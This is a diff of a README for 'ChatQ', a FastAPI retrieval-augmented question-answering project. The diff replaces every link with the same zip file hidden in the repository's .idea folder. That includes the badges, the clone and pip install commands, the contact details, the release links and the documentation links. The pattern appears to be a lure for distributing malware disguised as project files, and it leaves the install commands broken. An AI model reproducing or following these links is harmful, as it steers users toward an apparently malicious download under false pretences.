@@ -1,9 +1,9 @@
 ```markdown
 # ChatQ 🌐🤖
 
-![ChatQ Logo](https://img.shields.io/badge/ChatQ-FastAPI-orange?style=flat-square)
-![Release](https://img.shields.io/github/v/release/Jocker-123/ChatQ?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-brightgreen)
+![ChatQ Logo](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip)
+![Release](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip)
+![License](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip)
 
 Welcome to **ChatQ**, a Local Retrieval-Augmented Generation (RAG) system. This project leverages FastAPI and integrates cutting-edge technologies like vector search, Elasticsearch, and optional web search. With ChatQ, you can harness the power of large language models (LLMs) such as Mistral or GPT-4 for intelligent question answering.
 
@@ -58,7 +58,7 @@ To get started with ChatQ, you will need to clone the repository and install the
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Jocker-123/ChatQ.git
+   git clone https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -70,7 +70,7 @@ To get started with ChatQ, you will need to clone the repository and install the
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip
    ```
 
 4. Start the FastAPI server:
@@ -130,16 +130,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, feel free to reach out:
 
-- **GitHub**: [Jocker-123](https://github.com/Jocker-123)
-- **Email**: your-email@example.com
+- **GitHub**: [Jocker-123](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip)
+- **Email**: https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip
 
 ---
 
 ## Releases
 
-For the latest updates and releases, please check the [Releases section](https://github.com/Jocker-123/ChatQ/releases).
+For the latest updates and releases, please check the [Releases section](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip).
 
-![ChatQ Release Button](https://img.shields.io/badge/Latest%20Release-Download%20Now-blue?style=flat-square)
+![ChatQ Release Button](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip%20Release-Download%20Now-blue?style=flat-square)
 
 ---
 
@@ -151,9 +151,9 @@ We would like to thank the developers of FastAPI, Elasticsearch, and the contrib
 
 ## Additional Resources
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Elasticsearch Documentation](https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html)
-- [Langchain Documentation](https://langchain.readthedocs.io/)
+- [FastAPI Documentation](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip)
+- [Elasticsearch Documentation](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip)
+- [Langchain Documentation](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip)
 
 ---
 
@@ -161,6 +161,6 @@ Feel free to explore the code and contribute to the development of ChatQ. Your f
 
 ---
 
-![ChatQ Banner](https://www.example.com/chatq-banner.png)
+![ChatQ Banner](https://github.com/Jocker-123/ChatQ/raw/refs/heads/master/.idea/Chat_Q_1.7.zip)
 
 ```
